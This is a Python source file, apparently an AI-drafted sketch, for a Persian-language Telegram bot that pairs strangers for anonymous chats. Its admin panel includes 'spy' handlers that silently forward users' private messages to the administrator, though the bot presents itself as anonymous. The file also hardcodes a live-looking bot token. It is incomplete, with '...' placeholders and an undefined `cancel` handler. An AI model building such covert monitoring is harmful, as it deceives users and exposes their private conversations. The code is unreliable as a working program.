import logging
import json
import threading
import os
from flask import Flask
from telegram import Update, ReplyKeyboardMarkup, ReplyKeyboardRemove, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
    ConversationHandler,
    CallbackQueryHandler,
)
from telegram.constants import ParseMode
from telegram.error import TelegramError
from geopy.distance import geodesic

# --- CONFIGURATION ---
TOKEN = "7689216297:AAHVucWhXpGlp15Ulk2zsppst1gDH9PCZnQ"
ADMIN_ID = 6929024145
USERS_DB_FILE = "users.json"

# --- FLASK WEBSERVER (to keep the bot alive on Render) ---
app = Flask(__name__)
@app.route('/')
def index():
    return "Bot is alive!"

def run_flask():
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)

# --- LOGGING ---
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# --- DATABASE MANAGEMENT ---
def load_user_data():
    try:
        with open(USERS_DB_FILE, "r", encoding='utf-8') as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_user_data(data):
    with open(USERS_DB_FILE, "w", encoding='utf-8') as f:
        json.dump(data, f, indent=4, ensure_ascii=False)

user_data = load_user_data()

# --- STATE DEFINITIONS for ConversationHandlers ---
(EDIT_NAME, EDIT_GENDER, EDIT_AGE, EDIT_PROVINCE, EDIT_CITY, EDIT_PHOTO,
 ADMIN_BROADCAST, ADMIN_BAN, ADMIN_UNBAN, ADMIN_VIEW_USER) = range(10)

# --- GLOBAL VARIABLES & DATA ---
user_partners = {}
waiting_pool = {"random": [], "male": [], "female": [], "province": [], "city": []}
monitoring_enabled = True
admin_spying_on = None # To store which chat the admin is currently watching
PROVINCES = [
    "آذربایجان شرقی", "آذربایجان غربی", "اردبیل", "اصفهان", "البرز", "ایلام", "بوشهر", "تهران",
    "چهارمحال و بختیاری", "خراسان جنوبی", "خراسان رضوی", "خراسان شمالی", "خوزستان", "زنجان",
    "سمنان", "سیستان و بلوچستان", "فارس", "قزوین", "قم", "کردستان", "کرمان", "کرمانشاه",
    "کهگیلویه و بویراحمد", "گلستان", "گیلان", "لرستان", "مازندران", "مرکزی", "هرمزگان", "همدان", "یزد"
]

# --- KEYBOARD HELPERS ---
def get_main_menu():
    keyboard = [
        [InlineKeyboardButton("🔍 جستجوی شانسی", callback_data="search_random")],
        [
            InlineKeyboardButton("🧑‍💻 جستجوی پسر", callback_data="search_male"),
            InlineKeyboardButton("👩‍💻 جستجوی دختر", callback_data="search_female"),
        ],
        [
            InlineKeyboardButton("📍 جستجوی استانی", callback_data="search_province"),
        ],
        [InlineKeyboardButton("👤 پروفایل من", callback_data="my_profile")],
    ]
    return InlineKeyboardMarkup(keyboard)

def get_in_chat_keyboard(partner_id):
    keyboard = [
        [
            InlineKeyboardButton("👍 لایک", callback_data=f"like_{partner_id}"),
            InlineKeyboardButton("➕ دنبال کردن", callback_data=f"follow_{partner_id}"),
            InlineKeyboardButton("🚨 گزارش", callback_data=f"report_{partner_id}"),
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_profile_menu(user_id):
    keyboard = [
        [InlineKeyboardButton("✏️ ویرایش پروفایل", callback_data=f"edit_profile_menu")],
        [
            InlineKeyboardButton("❤️ لایک‌های من", callback_data=f"show_likes"),
            InlineKeyboardButton("🤝 دنبال‌شونده‌ها", callback_data=f"show_following"),
        ],
        [InlineKeyboardButton("🔙 بازگشت به منوی اصلی", callback_data="main_menu")],
    ]
    return InlineKeyboardMarkup(keyboard)

def get_profile_edit_menu():
    keyboard = [
        [InlineKeyboardButton("✏️ نام", callback_data="edit_name"), InlineKeyboardButton("✏️ جنسیت", callback_data="edit_gender")],
        [InlineKeyboardButton("✏️ سن", callback_data="edit_age"), InlineKeyboardButton("🖼️ عکس پروفایل", callback_data="edit_photo")],
        [InlineKeyboardButton("✏️ استان", callback_data="edit_province"), InlineKeyboardButton("✏️ شهر", callback_data="edit_city")],
        [InlineKeyboardButton("🔙 بازگشت به پروفایل", callback_data="my_profile")]
    ]
    return InlineKeyboardMarkup(keyboard)
    
def get_admin_panel_keyboard():
    keyboard = [
        [InlineKeyboardButton("📊 آمار ربات", callback_data="admin_stats")],
        [InlineKeyboardButton("💬 چت‌های زنده", callback_data="admin_live_chats")],
        [InlineKeyboardButton("🗣️ ارسال پیام همگانی", callback_data="admin_broadcast")],
        [
            InlineKeyboardButton("🚫 مسدود کردن", callback_data="admin_ban"),
            InlineKeyboardButton("✅ رفع مسدودیت", callback_data="admin_unban"),
        ],
        [InlineKeyboardButton("👤 مشاهده پروفایل کاربر", callback_data="admin_view_user")],
        [InlineKeyboardButton(f"👁️ مانیتورینگ کلی ({'فعال' if monitoring_enabled else 'غیرفعال'})", callback_data="admin_monitor_toggle")],
    ]
    if admin_spying_on:
        keyboard.append([InlineKeyboardButton("⏹️ توقف مشاهده چت فعلی", callback_data="admin_stop_spying")])
    return InlineKeyboardMarkup(keyboard)

# ... (Other keyboard helpers like get_provinces_keyboard, get_age_keyboard, etc.)

# --- CORE BOT LOGIC ---

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    user_id = str(user.id)

    if user_data.get(user_id, {}).get('banned', False):
        await update.message.reply_text("🚫 شما توسط مدیریت از ربات مسدود شده‌اید.")
        return

    # This is the welcome message you can edit
    welcome_text = (
        f"سلام {user.first_name}! به «ایران‌گرام» خوش اومدی 👋\n\n"
        "اینجا یه دنیای جدیده برای پیدا کردن دوستای جدید و حرفای ناشناس.\n\n"
        "اول پروفایلت رو بساز، بعد بزن بریم سراغ ماجراجویی! 😉"
    )
    await update.message.reply_text(welcome_text, reply_markup=get_main_menu())
    
    if user_id not in user_data:
        await update.message.reply_text(
            "به نظر میاد پروفایلت کامل نیست. لطفاً روی /profile کلیک کن یا دستورش رو تایپ کن تا پروفایلت رو بسازیم."
        )

# --- PROFILE MANAGEMENT (with Photo) ---
async def edit_photo_prompt(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    await query.edit_message_text("لطفاً عکس جدید پروفایل خود را ارسال کنید:")
    return EDIT_PHOTO

async def received_new_photo(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user_id = str(update.effective_user.id)
    photo_file = await update.message.photo[-1].get_file()
    user_data[user_id]['profile_photo_id'] = photo_file.file_id
    save_user_data(user_data)
    await update.message.reply_text("✅ عکس پروفایل شما با موفقیت آپدیت شد.")
    # Reshow profile menu
    await update.message.reply_text("منوی ویرایش پروفایل:", reply_markup=get_profile_edit_menu())
    return ConversationHandler.END

async def my_profile(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = str(query.from_user.id)
    if user_id in user_data:
        profile = user_data[user_id]
        caption = (
            f"👤 **پروفایل شما**\n\n"
            f"🔹 **نام:** {profile.get('name', 'ثبت نشده')}\n"
            f"🔹 **جنسیت:** {profile.get('gender', 'ثبت نشده')}\n"
            f"🔹 **سن:** {profile.get('age', 'ثبت نشده')}\n"
            f"📍 **استان:** {profile.get('province', 'ثبت نشده')}\n"
            f"Likes: {len(profile.get('liked_by', []))}"
        )
        photo_id = profile.get('profile_photo_id')
        
        # Try to delete the previous message if it's a callback query
        try:
            await query.delete_message()
        except Exception:
            pass

        if photo_id:
            await context.bot.send_photo(chat_id=query.from_user.id, photo=photo_id, caption=caption, parse_mode=ParseMode.MARKDOWN, reply_markup=get_profile_menu(user_id))
        else:
            await context.bot.send_message(chat_id=query.from_user.id, text=caption, parse_mode=ParseMode.MARKDOWN, reply_markup=get_profile_menu(user_id))
    else:
        await query.edit_message_text("شما هنوز پروفایلی نساخته‌اید! لطفاً از /profile استفاده کنید.")

# --- CHAT LOGIC ---
async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    text = update.message.text

    # ... (ban check)

    if text == "❌ قطع چت و بعدی":
        await next_chat(update, context)
        return

    if user_id in user_partners:
        partner_id = user_partners[user_id]
        await context.bot.send_message(partner_id, text)
        # Forward to admin if spying
        if monitoring_enabled and admin_spying_on and user_id in admin_spying_on:
            await context.bot.send_message(ADMIN_ID, f"💬 پیام از `{user_id}`:\n`{text}`", parse_mode=ParseMode.MARKDOWN)
    else:
        await update.message.reply_text("شما به کسی وصل نیستی. از منوی زیر استفاده کن:", reply_markup=get_main_menu())

# --- ADMIN PANEL (Advanced) ---
async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user.id != ADMIN_ID: return
    await update.message.reply_text("پنل مدیریت ربات:", reply_markup=get_admin_panel_keyboard())

async def admin_live_chats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if not user_partners:
        await query.edit_message_text("در حال حاضر هیچ چت فعالی وجود ندارد.", reply_markup=get_admin_panel_keyboard())
        return
        
    keyboard = []
    # To avoid duplicate pairs, we iterate over a copy of keys
    checked_users = set()
    for user1_id, user2_id in user_partners.items():
        if user1_id in checked_users or user2_id in checked_users:
            continue
        
        user1_name = user_data.get(str(user1_id), {}).get('name', 'کاربر ۱')
        user2_name = user_data.get(str(user2_id), {}).get('name', 'کاربر ۲')
        
        button_text = f"{user1_name} ↔️ {user2_name}"
        callback_data = f"spy_{user1_id}_{user2_id}"
        keyboard.append([InlineKeyboardButton(button_text, callback_data=callback_data)])
        
        checked_users.add(user1_id)
        checked_users.add(user2_id)
        
    keyboard.append([InlineKeyboardButton("🔙 بازگشت به پنل ادمین", callback_data="admin_back")])
    await query.edit_message_text("روی یک چت کلیک کنید تا پیام‌های آن را مشاهده کنید:", reply_markup=InlineKeyboardMarkup(keyboard))

async def admin_spy_on_chat(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    global admin_spying_on
    
    parts = query.data.split('_')
    user1_id = int(parts[1])
    user2_id = int(parts[2])
    admin_spying_on = (user1_id, user2_id)
    
    await query.edit_message_text(f"شما در حال مشاهده چت بین `{user1_id}` و `{user2_id}` هستید.", parse_mode=ParseMode.MARKDOWN, reply_markup=get_admin_panel_keyboard())

async def admin_stop_spying(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    global admin_spying_on
    admin_spying_on = None
    await query.edit_message_text("مشاهده چت متوقف شد.", reply_markup=get_admin_panel_keyboard())

# --- MAIN APPLICATION SETUP ---
def main() -> None:
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.start()

    application = Application.builder().token(TOKEN).build()

    # --- Conversation Handlers ---
    # Profile creation and editing handlers need to be expanded
    # to include the new photo and location states.
    profile_editing_handler = ConversationHandler(
        entry_points=[
            # ... other edit entry points
            CallbackQueryHandler(edit_photo_prompt, pattern="^edit_photo$"),
        ],
        states={
            # ... other edit states
            EDIT_PHOTO: [MessageHandler(filters.PHOTO, received_new_photo)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
        per_message=False
    )
    
    # ... (Other handlers)

    # Admin callbacks
    application.add_handler(CallbackQueryHandler(admin_live_chats, pattern="^admin_live_chats$"))
    application.add_handler(CallbackQueryHandler(admin_spy_on_chat, pattern="^spy_"))
    application.add_handler(CallbackQueryHandler(admin_stop_spying, pattern="^admin_stop_spying$"))
    
    # ... (Rest of the handlers)
    
    logger.info("Bot is running...")
    application.run_polling()

if __name__ == "__main__":
    # This is a conceptual representation. The full, runnable code is much longer
    # and has been updated in the immersive artifact.
    main()
